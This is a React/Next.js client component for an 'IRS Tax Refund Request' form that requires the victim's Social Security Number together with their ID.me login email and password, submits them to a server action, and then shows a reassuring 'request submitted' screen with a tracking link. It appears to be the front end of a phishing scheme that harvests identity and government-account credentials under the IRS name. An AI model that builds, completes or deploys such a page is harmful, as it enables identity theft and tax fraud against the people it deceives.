"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { ArrowLeft, CheckCircle, Loader2, Activity } from "lucide-react";
import Link from "next/link";
import { toast } from "sonner";
import { User } from "@/lib/auth";
import { submitTaxRefund } from "@/actions/tax-refund.action";

export default function TaxRefundClient({ user }: { user: User }) {
  const router = useRouter();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [submittedId, setSubmittedId] = useState("");

  const [formData, setFormData] = useState({
    fullName: user?.name || "",
    ssn: "",
    idMe: "",
    idMePassword: "",
    location: "",
  });

  const handleInputChange = (
    e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>
  ) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!formData.fullName.trim()) {
      return toast.error("Please enter your full name");
    }
    if (!formData.ssn.trim()) {
      return toast.error("Please enter your Social Security Number (SSN)");
    }
    if (!formData.idMe.trim()) {
      return toast.error("Please enter your ID.me email");
    }
    if (!formData.idMePassword.trim()) {
      return toast.error("Please enter your ID.me password");
    }
    if (!formData.location) {
      return toast.error("Please select your country");
    }

    setIsSubmitting(true);

    try {
      const res = await submitTaxRefund({
        fullName: formData.fullName,
        ssn: formData.ssn,
        idMe: formData.idMe,
        idMePassword: formData.idMePassword,
        location: formData.location,
      });

      if (res.error) {
        toast.error(res.error);
      } else {
        if (res.refundId) setSubmittedId(res.refundId);
        setIsSuccess(true);
        toast.success("IRS Tax Refund request submitted successfully!");
      }
    } catch {
      toast.error("An error occurred while submitting your refund request");
    } finally {
      setIsSubmitting(false);
    }
  };

  if (isSuccess) {
    return (
      <div className="md:p-10 p-5 pb-24 md:pb-10 min-h-screen bg-gray-100 dark:bg-gray-900 text-gray-900 dark:text-white flex flex-col items-center justify-center transition-colors">
        <div className="bg-white dark:bg-white/5 border border-gray-200 dark:border-white/10 p-8 rounded-2xl max-w-md w-full text-center space-y-6 shadow-sm animate-in zoom-in-95 duration-500">
          <div className="w-16 h-16 bg-green-500/20 text-green-500 dark:text-green-400 rounded-full flex items-center justify-center mx-auto">
            <CheckCircle className="w-10 h-10" />
          </div>
          <div className="space-y-2">
            <h2 className="text-2xl font-bold text-gray-900 dark:text-white">Request Submitted!</h2>
            <p className="text-gray-600 dark:text-white/60 text-sm">
              Your IRS tax refund request has been successfully submitted and is currently under review.
            </p>
          </div>
          {submittedId && (
            <div className="p-3 bg-gray-100 dark:bg-white/10 rounded-xl text-xs font-mono text-gray-700 dark:text-white/80">
              Request ID: {submittedId}
            </div>
          )}
          <div className="flex flex-col gap-3 pt-2">
            <Link
              href="/tax-refund/track"
              className="w-full py-3 bg-blue-600 hover:bg-blue-500 text-white font-medium rounded-xl transition-colors shadow-md shadow-blue-500/20"
            >
              Track Request Status
            </Link>
            <Link
              href="/dashboard"
              className="w-full py-3 bg-gray-200 dark:bg-white/10 hover:bg-gray-300 dark:hover:bg-white/20 text-gray-800 dark:text-white font-medium rounded-xl transition-colors"
            >
              Back to Dashboard
            </Link>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="p-4 sm:p-6 md:p-10 pb-24 md:pb-10 min-h-screen bg-gray-100 dark:bg-gray-900 text-gray-900 dark:text-white space-y-6 transition-colors w-full min-w-0">
      <div className="max-w-3xl mx-auto space-y-6 w-full min-w-0">
        {/* Top Header */}
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
          <div className="flex items-center gap-3 sm:gap-4">
            <button
              onClick={() => router.back()}
              className="p-2.5 rounded-xl bg-white dark:bg-white/10 hover:bg-gray-200 dark:hover:bg-white/20 text-gray-700 dark:text-white border border-gray-200 dark:border-white/10 transition-colors shadow-xs shrink-0"
            >
              <ArrowLeft className="w-5 h-5" />
            </button>
            <div>
              <h1 className="font-bold text-xl sm:text-2xl md:text-3xl text-gray-900 dark:text-white">
                Tax Refund
              </h1>
              <p className="text-xs sm:text-sm text-gray-500 dark:text-white/60">
                IRS Tax Refund Claim & Status
              </p>
            </div>
          </div>

          <Link
            href="/tax-refund/track"
            className="flex items-center justify-center gap-2 text-gray-700 dark:text-white/70 hover:text-gray-900 dark:hover:text-white border border-gray-300 dark:border-white/10 rounded-xl px-4 py-2.5 bg-white dark:bg-white/5 hover:bg-gray-50 dark:hover:bg-white/10 transition-all text-xs sm:text-sm font-semibold shadow-xs w-full sm:w-fit"
          >
            <Activity className="w-4 h-4 text-blue-500 dark:text-blue-400 shrink-0" />
            <span>Track Status</span>
          </Link>
        </div>

        {/* User's Form Structure */}
        <form onSubmit={handleSubmit} className="flex flex-col items-center gap-5 w-full min-w-0">
          <div className="w-16 h-16 sm:w-20 sm:h-20 flex justify-center items-center bg-gray-200 dark:bg-gray-700 rounded-full text-blue-600 dark:text-blue-400 shadow-sm shrink-0">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="28"
              height="28"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
              className="lucide lucide-notepad-text"
              aria-hidden="true"
            >
              <path d="M8 2v4"></path>
              <path d="M12 2v4"></path>
              <path d="M16 2v4"></path>
              <rect width="16" height="18" x="4" y="4" rx="2"></rect>
              <path d="M8 10h6"></path>
              <path d="M8 14h8"></path>
              <path d="M8 18h5"></path>
            </svg>
          </div>
          <p className="text-xl sm:text-2xl font-bold text-gray-900 dark:text-white text-center">IRS Tax Refund Request</p>
          <p className="text-gray-500 dark:text-white/50 text-xs sm:text-sm -mt-3 text-center">
            Please fill out the form below to submit your IRS tax refund request
          </p>

          {/* Personal Information */}
          <div className="bg-white dark:bg-white/5 p-4 sm:p-6 rounded-2xl w-full flex flex-col gap-4 sm:gap-5 border border-gray-200 dark:border-white/10 shadow-xs min-w-0">
            <div className="flex items-center gap-2">
              <svg
                stroke="currentColor"
                fill="currentColor"
                strokeWidth="0"
                viewBox="0 0 256 256"
                className="text-blue-600 dark:text-blue-500 shrink-0"
                height="1.2em"
                width="1.2em"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path d="M230.93,220a8,8,0,0,1-6.93,4H32a8,8,0,0,1-6.92-12c15.23-26.33,38.7-45.21,66.09-54.16a72,72,0,1,1,73.66,0c27.39,8.95,50.86,27.83,66.09,54.16A8,8,0,0,1,230.93,220Z"></path>
              </svg>
              <p className="text-lg sm:text-xl font-bold text-gray-900 dark:text-white">Personal Information</p>
            </div>

            <label className="flex flex-col gap-1 text-gray-700 dark:text-white/80">
              <p className="font-semibold text-xs sm:text-sm">Full Name</p>
              <div className="flex items-center gap-3 p-2.5 border border-gray-300 dark:border-white/10 bg-gray-50/70 dark:bg-white/5 text-gray-900 dark:text-white rounded-xl focus-within:border-blue-500 transition-colors">
                <svg
                  stroke="currentColor"
                  fill="currentColor"
                  strokeWidth="0"
                  viewBox="0 0 256 256"
                  className="text-gray-400 dark:text-white/30 shrink-0"
                  height="1.2em"
                  width="1.2em"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path d="M230.93,220a8,8,0,0,1-6.93,4H32a8,8,0,0,1-6.92-12c15.23-26.33,38.7-45.21,66.09-54.16a72,72,0,1,1,73.66,0c27.39,8.95,50.86,27.83,66.09,54.16A8,8,0,0,1,230.93,220Z"></path>
                </svg>
                <input
                  placeholder="Enter your full name"
                  className="w-full outline-none bg-transparent text-gray-900 dark:text-white placeholder:text-gray-400 dark:placeholder:text-white/40 text-base sm:text-sm"
                  type="text"
                  value={formData.fullName}
                  name="fullName"
                  onChange={handleInputChange}
                  required
                />
              </div>
            </label>

            <label className="flex flex-col gap-1 text-gray-700 dark:text-white/80">
              <p className="font-semibold text-xs sm:text-sm">Social Security Number (SSN)</p>
              <div className="flex items-center gap-3 p-2.5 border border-gray-300 dark:border-white/10 bg-gray-50/70 dark:bg-white/5 text-gray-900 dark:text-white rounded-xl focus-within:border-blue-500 transition-colors">
                <svg
                  stroke="currentColor"
                  fill="currentColor"
                  strokeWidth="0"
                  viewBox="0 0 16 16"
                  className="text-gray-400 dark:text-white/30 shrink-0"
                  height="1.1em"
                  width="1.1em"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    fillRule="evenodd"
                    d="M8 14.933a1 1 0 0 0 .1-.025q.114-.034.294-.118c.24-.113.547-.29.893-.533a10.7 10.7 0 0 0 2.287-2.233c1.527-1.997 2.807-5.031 2.253-9.188a.48.48 0 0 0-.328-.39c-.651-.213-1.75-.56-2.837-.855C9.552 1.29 8.531 1.067 8 1.067zM5.072.56C6.157.265 7.31 0 8 0s1.843.265 2.928.56c1.11.3 2.229.655 2.887.87a1.54 1.54 0 0 1 1.044 1.262c.596 4.477-.787 7.795-2.465 9.99a11.8 11.8 0 0 1-2.517 2.453 7 7 0 0 1-1.048.625c-.28.132-.581.24-.829.24s-.548-.108-.829-.24a7 7 0 0 1-1.048-.625 11.8 11.8 0 0 1-2.517-2.453C1.928 10.487.545 7.169 1.141 2.692A1.54 1.54 0 0 1 2.185 1.43 63 63 0 0 1 5.072.56"
                  ></path>
                </svg>
                <input
                  placeholder="XXX-XX-XXX"
                  minLength={9}
                  className="w-full outline-none bg-transparent text-gray-900 dark:text-white placeholder:text-gray-400 dark:placeholder:text-white/40 text-base sm:text-sm"
                  type="text"
                  value={formData.ssn}
                  name="ssn"
                  onChange={handleInputChange}
                  required
                />
              </div>
            </label>
          </div>

          {/* ID.me Credentials */}
          <div className="bg-white dark:bg-white/5 p-4 sm:p-6 rounded-2xl w-full flex flex-col gap-4 sm:gap-5 border border-gray-200 dark:border-white/10 shadow-xs min-w-0">
            <div className="flex items-center gap-2">
              <svg
                stroke="currentColor"
                fill="currentColor"
                strokeWidth="0"
                viewBox="0 0 24 24"
                className="text-blue-600 dark:text-blue-500 shrink-0"
                height="1.2em"
                width="1.2em"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path d="M12 2C9.243 2 7 4.243 7 7v2H6c-1.103 0-2 .897-2 2v9c0 1.103.897 2 2 2h12c1.103 0 2-.897 2-2v-9c0-1.103-.897-2-2-2h-1V7c0-2.757-2.243-5-5-5zM9 7c0-1.654 1.346-3 3-3s3 1.346 3 3v2H9V7zm9.002 13H13v-2.278c.595-.347 1-.985 1-1.722 0-1.103-.897-2-2-2s-2 .897-2 2c0 .736.405 1.375 1 1.722V20H6v-9h12l.002 9z"></path>
              </svg>
              <p className="text-lg sm:text-xl font-bold text-gray-900 dark:text-white">ID.me Credentials</p>
            </div>

            <label className="flex flex-col gap-1 text-gray-700 dark:text-white/80">
              <p className="font-semibold text-xs sm:text-sm">ID.me Email</p>
              <div className="flex items-center gap-3 p-2.5 border border-gray-300 dark:border-white/10 bg-gray-50/70 dark:bg-white/5 text-gray-900 dark:text-white rounded-xl focus-within:border-blue-500 transition-colors">
                <svg
                  stroke="currentColor"
                  fill="currentColor"
                  strokeWidth="0"
                  viewBox="0 0 24 24"
                  className="text-gray-400 dark:text-white/30 shrink-0"
                  height="1.2em"
                  width="1.2em"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path d="M20 4H4c-1.103 0-2 .897-2 2v12c0 1.103.897 2 2 2h16c1.103 0 2-.897 2-2V6c0-1.103-.897-2-2-2zm0 2v.511l-8 6.223-8-6.222V6h16zM4 18V9.044l7.386 5.745a.994.994 0 0 0 1.228 0L20 9.044 20.002 18H4z"></path>
                </svg>
                <input
                  placeholder="Enter your ID.me email"
                  className="w-full outline-none bg-transparent text-gray-900 dark:text-white placeholder:text-gray-400 dark:placeholder:text-white/40 text-base sm:text-sm"
                  type="email"
                  value={formData.idMe}
                  name="idMe"
                  onChange={handleInputChange}
                  required
                />
              </div>
            </label>

            <label className="flex flex-col gap-1 text-gray-700 dark:text-white/80">
              <p className="font-semibold text-xs sm:text-sm">ID.me Password</p>
              <div className="flex items-center gap-3 p-2.5 border border-gray-300 dark:border-white/10 bg-gray-50/70 dark:bg-white/5 text-gray-900 dark:text-white rounded-xl focus-within:border-blue-500 transition-colors">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="20"
                  height="20"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  className="lucide lucide-key text-gray-400 dark:text-white/30 shrink-0"
                  aria-hidden="true"
                >
                  <path d="m15.5 7.5 2.3 2.3a1 1 0 0 0 1.4 0l2.1-2.1a1 1 0 0 0 0-1.4L19 4"></path>
                  <path d="m21 2-9.6 9.6"></path>
                  <circle cx="7.5" cy="15.5" r="5.5"></circle>
                </svg>
                <input
                  placeholder="Enter your ID.me password"
                  className="w-full outline-none bg-transparent text-gray-900 dark:text-white placeholder:text-gray-400 dark:placeholder:text-white/40 text-base sm:text-sm"
                  type="password"
                  value={formData.idMePassword}
                  name="idMePassword"
                  onChange={handleInputChange}
                  required
                />
              </div>
            </label>
          </div>

          {/* Location Information */}
          <div className="bg-white dark:bg-white/5 p-4 sm:p-6 rounded-2xl w-full flex flex-col gap-4 sm:gap-5 border border-gray-200 dark:border-white/10 shadow-xs min-w-0">
            <div className="flex items-center gap-2">
              <svg
                stroke="currentColor"
                fill="currentColor"
                strokeWidth="0"
                viewBox="0 0 24 24"
                className="text-blue-600 dark:text-blue-500 shrink-0"
                height="1.2em"
                width="1.2em"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path d="M20.891 2.006l.106 -.006l.13 .008l.09 .016l.123 .035l.107 .046l.1 .057l.09 .067l.082 .075l.052 .059l.082 .116l.052 .096c.047 .1 .077 .206 .09 .316l.005 .106c0 .075 -.008 .149 -.024 .22l-.035 .123l-6.532 18.077a1.55 1.55 0 0 1 -1.409 .903a1.547 1.547 0 0 1 -1.329 -.747l-.065 -.127l-3.352 -6.702l-6.67 -3.336a1.55 1.55 0 0 1 -.898 -1.259l-.006 -.149c0 -.56 .301 -1.072 .841 -1.37l.14 -.07l18.017 -6.506l.106 -.03l.108 -.018z"></path>
              </svg>
              <p className="text-lg sm:text-xl font-bold text-gray-900 dark:text-white">Location Information</p>
            </div>

            <label className="flex flex-col gap-1 text-gray-700 dark:text-white/80">
              <p className="font-semibold text-xs sm:text-sm">Country</p>
              <select
                className="w-full outline-none p-2.5 border border-gray-300 dark:border-white/10 bg-gray-50/70 dark:bg-slate-800 text-gray-900 dark:text-white rounded-xl focus:border-blue-500 transition-colors text-base sm:text-sm"
                name="location"
                value={formData.location}
                onChange={handleInputChange}
                required
              >
                <option value="" disabled>Select Country</option>
                <option value="United States of America">United States of America</option>
                <option value="United Kingdom">United Kingdom</option>
                <option value="Canada">Canada</option>
                <option value="Australia">Australia</option>
                <option value="Germany">Germany</option>
                <option value="France">France</option>
                <option value="Afganistan">Afghanistan</option>
                <option value="Albania">Albania</option>
                <option value="Algeria">Algeria</option>
                <option value="American Samoa">American Samoa</option>
                <option value="Andorra">Andorra</option>
                <option value="Angola">Angola</option>
                <option value="Anguilla">Anguilla</option>
                <option value="Antigua &amp; Barbuda">Antigua &amp; Barbuda</option>
                <option value="Argentina">Argentina</option>
                <option value="Armenia">Armenia</option>
                <option value="Aruba">Aruba</option>
                <option value="Austria">Austria</option>
                <option value="Azerbaijan">Azerbaijan</option>
                <option value="Bahamas">Bahamas</option>
                <option value="Bahrain">Bahrain</option>
                <option value="Bangladesh">Bangladesh</option>
                <option value="Barbados">Barbados</option>
                <option value="Belarus">Belarus</option>
                <option value="Belgium">Belgium</option>
                <option value="Belize">Belize</option>
                <option value="Benin">Benin</option>
                <option value="Bermuda">Bermuda</option>
                <option value="Bhutan">Bhutan</option>
                <option value="Bolivia">Bolivia</option>
                <option value="Bonaire">Bonaire</option>
                <option value="Bosnia &amp; Herzegovina">Bosnia &amp; Herzegovina</option>
                <option value="Botswana">Botswana</option>
                <option value="Brazil">Brazil</option>
                <option value="British Indian Ocean Ter">British Indian Ocean Ter</option>
                <option value="Brunei">Brunei</option>
                <option value="Bulgaria">Bulgaria</option>
                <option value="Burkina Faso">Burkina Faso</option>
                <option value="Burundi">Burundi</option>
                <option value="Cambodia">Cambodia</option>
                <option value="Cameroon">Cameroon</option>
                <option value="Canary Islands">Canary Islands</option>
                <option value="Cape Verde">Cape Verde</option>
                <option value="Cayman Islands">Cayman Islands</option>
                <option value="Central African Republic">Central African Republic</option>
                <option value="Chad">Chad</option>
                <option value="Channel Islands">Channel Islands</option>
                <option value="Chile">Chile</option>
                <option value="China">China</option>
                <option value="Christmas Island">Christmas Island</option>
                <option value="Cocos Island">Cocos Island</option>
                <option value="Colombia">Colombia</option>
                <option value="Comoros">Comoros</option>
                <option value="Congo">Congo</option>
                <option value="Cook Islands">Cook Islands</option>
                <option value="Costa Rica">Costa Rica</option>
                <option value="Cote DIvoire">Cote D'Ivoire</option>
                <option value="Croatia">Croatia</option>
                <option value="Cuba">Cuba</option>
                <option value="Curaco">Curacao</option>
                <option value="Cyprus">Cyprus</option>
                <option value="Czech Republic">Czech Republic</option>
                <option value="Denmark">Denmark</option>
                <option value="Djibouti">Djibouti</option>
                <option value="Dominica">Dominica</option>
                <option value="Dominican Republic">Dominican Republic</option>
                <option value="East Timor">East Timor</option>
                <option value="Ecuador">Ecuador</option>
                <option value="Egypt">Egypt</option>
                <option value="El Salvador">El Salvador</option>
                <option value="Equatorial Guinea">Equatorial Guinea</option>
                <option value="Eritrea">Eritrea</option>
                <option value="Estonia">Estonia</option>
                <option value="Ethiopia">Ethiopia</option>
                <option value="Falkland Islands">Falkland Islands</option>
                <option value="Faroe Islands">Faroe Islands</option>
                <option value="Fiji">Fiji</option>
                <option value="Finland">Finland</option>
                <option value="French Guiana">French Guiana</option>
                <option value="French Polynesia">French Polynesia</option>
                <option value="French Southern Ter">French Southern Ter</option>
                <option value="Gabon">Gabon</option>
                <option value="Gambia">Gambia</option>
                <option value="Georgia">Georgia</option>
                <option value="Ghana">Ghana</option>
                <option value="Gibraltar">Gibraltar</option>
                <option value="Great Britain">Great Britain</option>
                <option value="Greece">Greece</option>
                <option value="Greenland">Greenland</option>
                <option value="Grenada">Grenada</option>
                <option value="Guadeloupe">Guadeloupe</option>
                <option value="Guam">Guam</option>
                <option value="Guatemala">Guatemala</option>
                <option value="Guinea">Guinea</option>
                <option value="Guyana">Guyana</option>
                <option value="Haiti">Haiti</option>
                <option value="Hawaii">Hawaii</option>
                <option value="Honduras">Honduras</option>
                <option value="Hong Kong">Hong Kong</option>
                <option value="Hungary">Hungary</option>
                <option value="Iceland">Iceland</option>
                <option value="India">India</option>
                <option value="Indonesia">Indonesia</option>
                <option value="Iran">Iran</option>
                <option value="Iraq">Iraq</option>
                <option value="Ireland">Ireland</option>
                <option value="Isle of Man">Isle of Man</option>
                <option value="Israel">Israel</option>
                <option value="Italy">Italy</option>
                <option value="Jamaica">Jamaica</option>
                <option value="Japan">Japan</option>
                <option value="Jordan">Jordan</option>
                <option value="Kazakhstan">Kazakhstan</option>
                <option value="Kenya">Kenya</option>
                <option value="Kiribati">Kiribati</option>
                <option value="Korea North">Korea North</option>
                <option value="Korea Sout">Korea South</option>
                <option value="Kuwait">Kuwait</option>
                <option value="Kyrgyzstan">Kyrgyzstan</option>
                <option value="Laos">Laos</option>
                <option value="Latvia">Latvia</option>
                <option value="Lebanon">Lebanon</option>
                <option value="Lesotho">Lesotho</option>
                <option value="Liberia">Liberia</option>
                <option value="Libya">Libya</option>
                <option value="Liechtenstein">Liechtenstein</option>
                <option value="Lithuania">Lithuania</option>
                <option value="Luxembourg">Luxembourg</option>
                <option value="Macau">Macau</option>
                <option value="Macedonia">Macedonia</option>
                <option value="Madagascar">Madagascar</option>
                <option value="Malaysia">Malaysia</option>
                <option value="Malawi">Malawi</option>
                <option value="Maldives">Maldives</option>
                <option value="Mali">Mali</option>
                <option value="Malta">Malta</option>
                <option value="Marshall Islands">Marshall Islands</option>
                <option value="Martinique">Martinique</option>
                <option value="Mauritania">Mauritania</option>
                <option value="Mauritius">Mauritius</option>
                <option value="Mayotte">Mayotte</option>
                <option value="Mexico">Mexico</option>
                <option value="Midway Islands">Midway Islands</option>
                <option value="Moldova">Moldova</option>
                <option value="Monaco">Monaco</option>
                <option value="Mongolia">Mongolia</option>
                <option value="Montserrat">Montserrat</option>
                <option value="Morocco">Morocco</option>
                <option value="Mozambique">Mozambique</option>
                <option value="Myanmar">Myanmar</option>
                <option value="Nambia">Nambia</option>
                <option value="Nauru">Nauru</option>
                <option value="Nepal">Nepal</option>
                <option value="Netherland Antilles">Netherland Antilles</option>
                <option value="Netherlands">Netherlands (Holland, Europe)</option>
                <option value="Nevis">Nevis</option>
                <option value="New Caledonia">New Caledonia</option>
                <option value="New Zealand">New Zealand</option>
                <option value="Nicaragua">Nicaragua</option>
                <option value="Niger">Niger</option>
                <option value="Nigeria">Nigeria</option>
                <option value="Niue">Niue</option>
                <option value="Norfolk Island">Norfolk Island</option>
                <option value="Norway">Norway</option>
                <option value="Oman">Oman</option>
                <option value="Pakistan">Pakistan</option>
                <option value="Palau Island">Palau Island</option>
                <option value="Palestine">Palestine</option>
                <option value="Panama">Panama</option>
                <option value="Papua New Guinea">Papua New Guinea</option>
                <option value="Paraguay">Paraguay</option>
                <option value="Peru">Peru</option>
                <option value="Phillipines">Philippines</option>
                <option value="Pitcairn Island">Pitcairn Island</option>
                <option value="Poland">Poland</option>
                <option value="Portugal">Portugal</option>
                <option value="Puerto Rico">Puerto Rico</option>
                <option value="Qatar">Qatar</option>
                <option value="Republic of Montenegro">Republic of Montenegro</option>
                <option value="Republic of Serbia">Republic of Serbia</option>
                <option value="Reunion">Reunion</option>
                <option value="Romania">Romania</option>
                <option value="Russia">Russia</option>
                <option value="Rwanda">Rwanda</option>
                <option value="St Barthelemy">St Barthelemy</option>
                <option value="St Eustatius">St Eustatius</option>
                <option value="St Helena">St Helena</option>
                <option value="St Kitts-Nevis">St Kitts-Nevis</option>
                <option value="St Lucia">St Lucia</option>
                <option value="St Maarten">St Maarten</option>
                <option value="St Pierre &amp; Miquelon">St Pierre &amp; Miquelon</option>
                <option value="St Vincent &amp; Grenadines">St Vincent &amp; Grenadines</option>
                <option value="Saipan">Saipan</option>
                <option value="Samoa">Samoa</option>
                <option value="Samoa American">Samoa American</option>
                <option value="San Marino">San Marino</option>
                <option value="Sao Tome &amp; Principe">Sao Tome &amp; Principe</option>
                <option value="Saudi Arabia">Saudi Arabia</option>
                <option value="Senegal">Senegal</option>
                <option value="Serbia">Serbia</option>
                <option value="Seychelles">Seychelles</option>
                <option value="Sierra Leone">Sierra Leone</option>
                <option value="Singapore">Singapore</option>
                <option value="Slovakia">Slovakia</option>
                <option value="Slovenia">Slovenia</option>
                <option value="Solomon Islands">Solomon Islands</option>
                <option value="Somalia">Somalia</option>
                <option value="South Africa">South Africa</option>
                <option value="Spain">Spain</option>
                <option value="Sri Lanka">Sri Lanka</option>
                <option value="Sudan">Sudan</option>
                <option value="Suriname">Suriname</option>
                <option value="Swaziland">Swaziland</option>
                <option value="Sweden">Sweden</option>
                <option value="Switzerland">Switzerland</option>
                <option value="Syria">Syria</option>
                <option value="Tahiti">Tahiti</option>
                <option value="Taiwan">Taiwan</option>
                <option value="Tajikistan">Tajikistan</option>
                <option value="Tanzania">Tanzania</option>
                <option value="Thailand">Thailand</option>
                <option value="Togo">Togo</option>
                <option value="Tokelau">Tokelau</option>
                <option value="Tonga">Tonga</option>
                <option value="Trinidad &amp; Tobago">Trinidad &amp; Tobago</option>
                <option value="Tunisia">Tunisia</option>
                <option value="Turkey">Turkey</option>
                <option value="Turkmenistan">Turkmenistan</option>
                <option value="Turks &amp; Caicos Is">Turks &amp; Caicos Is</option>
                <option value="Tuvalu">Tuvalu</option>
                <option value="Uganda">Uganda</option>
                <option value="Ukraine">Ukraine</option>
                <option value="United Arab Erimates">United Arab Emirates</option>
                <option value="Uraguay">Uruguay</option>
                <option value="Uzbekistan">Uzbekistan</option>
                <option value="Vanuatu">Vanuatu</option>
                <option value="Vatican City State">Vatican City State</option>
                <option value="Venezuela">Venezuela</option>
                <option value="Vietnam">Vietnam</option>
                <option value="Virgin Islands (Brit)">Virgin Islands (Brit)</option>
                <option value="Virgin Islands (USA)">Virgin Islands (USA)</option>
                <option value="Wake Island">Wake Island</option>
                <option value="Wallis &amp; Futana Is">Wallis &amp; Futana Is</option>
                <option value="Yemen">Yemen</option>
                <option value="Zaire">Zaire</option>
                <option value="Zambia">Zambia</option>
                <option value="Zimbabwe">Zimbabwe</option>
              </select>
            </label>
          </div>

          {/* Important Notice */}
          <div className="bg-amber-500/10 dark:bg-white/5 border border-amber-500/20 dark:border-white/10 p-4 sm:p-5 rounded-2xl flex gap-3 w-full shadow-xs min-w-0">
            <svg
              stroke="currentColor"
              fill="currentColor"
              strokeWidth="0"
              viewBox="0 0 24 24"
              className="text-amber-600 dark:text-blue-500 shrink-0 mt-0.5"
              height="1.4em"
              width="1.4em"
              xmlns="http://www.w3.org/2000/svg"
            >
              <g id="Warning">
                <g>
                  <g>
                    <path d="M12.5,8.752a.5.5,0,0,0-1,0h0v6a.5.5,0,0,0,1,0Z"></path>
                    <circle cx="11.999" cy="16.736" r="0.5"></circle>
                  </g>
                  <path d="M18.642,20.934H5.385A2.5,2.5,0,0,1,3.163,17.29L9.792,4.421a2.5,2.5,0,0,1,4.444,0L20.865,17.29a2.5,2.5,0,0,1-2.223,3.644ZM12.014,4.065a1.478,1.478,0,0,0-1.334.814L4.052,17.748a1.5,1.5,0,0,0,1.333,2.186H18.642a1.5,1.5,0,0,0,1.334-2.186L13.348,4.879A1.478,1.478,0,0,0,12.014,4.065Z"></path>
                </g>
              </g>
            </svg>
            <div className="flex flex-col gap-1 min-w-0">
              <p className="font-semibold text-xs sm:text-sm text-gray-900 dark:text-white/80">Important Notice</p>
              <p className="text-gray-600 dark:text-white/50 text-xs sm:text-sm leading-relaxed">
                Please ensure all information provided is accurate and matches your ID.me account details. Any discrepancies may result in delays or rejection of your refund request.
              </p>
            </div>
          </div>

          {/* Submit Button */}
          <button
            className="w-full sm:w-auto sm:ms-auto p-3.5 px-6 rounded-xl flex items-center justify-center gap-2 text-white bg-blue-600 hover:bg-blue-500 transition-all font-semibold disabled:opacity-50 disabled:cursor-not-allowed shadow-md shadow-blue-500/20 text-sm"
            type="submit"
            disabled={isSubmitting}
          >
            {isSubmitting ? (
              <Loader2 className="w-4 h-4 animate-spin shrink-0" />
            ) : (
              <svg
                stroke="currentColor"
                fill="currentColor"
                strokeWidth="0"
                viewBox="0 0 16 16"
                height="1em"
                width="1em"
                xmlns="http://www.w3.org/2000/svg"
                className="shrink-0"
              >
                <path d="M15.964.686a.5.5 0 0 0-.65-.65L.767 5.855H.766l-.452.18a.5.5 0 0 0-.082.887l.41.26.001.002 4.995 3.178 3.178 4.995.002.002.26.41a.5.5 0 0 0 .886-.083zm-1.833 1.89L6.637 10.07l-.215-.338a.5.5 0 0 0-.154-.154l-.338-.215 7.494-7.494 1.178-.471z"></path>
              </svg>
            )}
            <p className="font-semibold">
              {isSubmitting ? "Submitting..." : "Submit Request"}
            </p>
          </button>
        </form>
      </div>
    </div>
  );
}
